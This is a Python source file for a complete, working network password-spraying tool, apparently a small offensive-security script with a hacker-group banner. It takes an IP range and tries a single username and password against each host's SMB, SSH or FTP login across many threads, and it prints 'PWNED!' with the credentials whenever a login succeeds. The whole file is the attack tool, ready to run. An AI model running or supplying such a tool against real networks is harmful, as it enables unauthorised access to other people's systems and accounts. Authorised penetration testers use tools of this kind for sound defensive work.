#!/bin/env python3
from colorama import init, Fore, Back, Style
import random
import sys
import os
import argparse
import time

import threading
from queue import Queue

import socket
import netaddr
import smbclient
import smbprotocol
import paramiko
import ftplib
FTP = ftplib.FTP

init()
def clear():
	os.system('clear')

yellow = '\u001b[38;5;226m'
green = '\u001b[38;5;46m'
coloursrandom = ['\u001b[38;5;196m', '\u001b[38;5;202m', '\u001b[38;5;226m', '\u001b[38;5;118m', '\u001b[38;5;45m', '\u001b[38;5;164m']
os.system('resize -s 30 100')
banner = rf'''{yellow}{Style.BRIGHT}
		 __________   ___   ______    _______   __    __       _______.
		|   ____\  \ /  /  /  __  \  |       \ |  |  |  |     /       |
		|  |__   \  V  /  |  |  |  | |  .--.  ||  |  |  |    |   (----`
		|   __|   >   <   |  |  |  | |  |  |  ||  |  |  |     \   \    
		|  |____ /  .  \  |  `--'  | |  '--'  ||  `--'  | .----)   |   
		|_______/__/ \__\  \______/  |_______/  \______/  |_______/    
		                                                          {Fore.BLUE}{Style.BRIGHT}
		                    SpiceSouls // sh0ck
		                      Beyond Root Sec{Style.RESET_ALL}
		                                                          '''
		
clear()
print('\u001b[38;5;196m' + '▄' * 100)
print(banner)
print('\u001b[38;5;196m' + '\n' + '▄' * 100)
print("" + Style.RESET_ALL)

parser = argparse.ArgumentParser(description='Spray your network for logins.')
parser.add_argument('ip', help="IP of Target OR Target IP Range", type=str)
parser.add_argument('protocol', choices=['smb', 'ssh', 'ftp'], help='Protocol to spary passwords at')
parser.add_argument('-u', help='Username', type=str)
parser.add_argument('-p', help='Password', type=str)
parser.add_argument('-t', metavar='threads', type=int,
                    help='threads to use', default=10)
args = parser.parse_args()

if not args.u:
	user = ''
else:
	user = args.u

if not args.p:
	passw = ''
else:
	passw = args.p

ips = list(netaddr.IPNetwork(args.ip).iter_hosts())

####################### Protocols

def smbprobe(ip, user, passw):
	ip = str(ip)
	try:
		smbclient.register_session(ip, username=user, password=passw)
		print(f"[{Fore.RED}{Style.BRIGHT}SMB{Style.RESET_ALL}][{ip}] {green}{Style.BRIGHT}PWNED!{Style.RESET_ALL}\nUser: {user}\nPassword: {passw}")
	except smbprotocol.exceptions.LogonFailure:
		print(f"[{Fore.RED}{Style.BRIGHT}SMB{Style.RESET_ALL}][{ip}] {Fore.RED}{Style.BRIGHT}X{Style.RESET_ALL}")
	except smbprotocol.exceptions.SMBException:
		print(f"[{Fore.RED}{Style.BRIGHT}SMB{Style.RESET_ALL}][{ip}] {Fore.RED}{Style.BRIGHT}X{Style.RESET_ALL}")
	except ValueError:
		pass
def sshprobe(ip, user, passw):
	try:
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(str(ip), username=user, password=passw, timeout=10)
		print(f"[{Fore.RED}{Style.BRIGHT}SSH{Style.RESET_ALL}][{ip}] {green}{Style.BRIGHT}PWNED!{Style.RESET_ALL}\nUser: {user}\nPassword: {passw}")
	except paramiko.ssh_exception.AuthenticationException:
		print(f"[{Fore.RED}{Style.BRIGHT}SSH{Style.RESET_ALL}][{ip}] {Fore.RED}{Style.BRIGHT}X{Style.RESET_ALL}")
	except paramiko.ssh_exception.NoValidConnectionsError:
		pass
	except socket.timeout:
		pass
def ftpprobe(ip, user, passw):
	try:
		with FTP(str(ip)) as ftp:
			ftp.login(user=user, passwd=passw)
			print(f"[{Fore.RED}{Style.BRIGHT}FTP{Style.RESET_ALL}][{ip}] {green}{Style.BRIGHT}PWNED!{Style.RESET_ALL}\nUser: {user}\nPassword: {passw}")
			ftp.quit()
	except ftplib.error_perm:
		print(f"[{Fore.RED}{Style.BRIGHT}FTP{Style.RESET_ALL}][{ip}] {Fore.RED}{Style.BRIGHT}X{Style.RESET_ALL}")
	except ConnectionRefusedError:
		pass
	except OSError:
		pass


###################### PROBING
try:
	if args.protocol == 'smb':
		print(f"[{Fore.BLUE}{Style.BRIGHT}*{Style.RESET_ALL}] Spraying SMB Logins for {args.ip}...")
		def threader():

			while True:
				worker = q.get()
				smbprobe(worker, user, passw)
				q.task_done()
		q = Queue()
		for a in range(args.t):
			t = threading.Thread(target=threader)
			t.daemon = True
			t.start()
		for worker in ips:
			q.put(worker)
		q.join()

	if args.protocol == 'ssh':
		print(f"[{Fore.BLUE}{Style.BRIGHT}*{Style.RESET_ALL}] Spraying SSH Logins for {args.ip}...")
		def threader():

			while True:
				worker = q.get()
				sshprobe(worker, user, passw)
				q.task_done()
		q = Queue()
		for a in range(args.t):
			t = threading.Thread(target=threader)
			t.daemon = True
			t.start()
		for worker in ips:
			q.put(worker)
		q.join()

	if args.protocol == 'ftp':
		print(f"[{Fore.BLUE}{Style.BRIGHT}*{Style.RESET_ALL}] Spraying FTP Logins for {args.ip}...")
		def threader():

			while True:
				worker = q.get()
				ftpprobe(worker, user, passw)
				q.task_done()
		q = Queue()
		for a in range(args.t):
			t = threading.Thread(target=threader)
			t.daemon = True
			t.start()
		for worker in ips:
			q.put(worker)
		q.join()


except KeyboardInterrupt:
	print("")
	sys.exit()


print("\nFinished.")
sys.exit()
